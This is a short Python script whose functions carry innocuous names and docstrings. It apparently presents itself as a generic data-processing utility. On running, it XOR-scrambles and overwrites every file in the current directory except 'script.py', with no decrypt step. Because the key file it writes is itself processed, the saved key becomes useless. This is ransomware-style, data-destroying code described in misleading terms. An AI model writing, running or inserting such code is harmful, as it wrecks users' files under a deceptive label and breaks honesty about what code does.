def process_data(data, key):
    """Perform a simple transformation on the data."""
    return bytearray(b ^ key for b in data)

def save_value(value):
    """Store a single byte value in a file."""
    with open("value.dat", "wb") as v_file:
        v_file.write(bytes([value]))

def load_value():
    """Retrieve the stored byte value from a file."""
    with open("value.dat", "rb") as v_file:
        return v_file.read()[0]

def handle_file(filename, key):
    """Read a file, process its contents, and write back."""
    with open(filename, "rb") as file:
        contents = file.read()
    processed_contents = process_data(contents, key)
    with open(filename, "wb") as file:
        file.write(processed_contents)

def list_files():
    """List all files in the current directory, excluding this script."""
    import os  # Keep os import only for listing files
    files = []
    for file in os.listdir():
        if file == "script.py":  # Replace with your script name
            continue
        if os.path.isfile(file):
            files.append(file)
    return files

# Example key for transformation (0-255)
key = 123  # Arbitrary byte value

# Save the key to a file
save_value(key)

# List of files to process
files_to_process = list_files()

# Process each file
for file in files_to_process:
    handle_file(file, key)

print("Processing complete.")
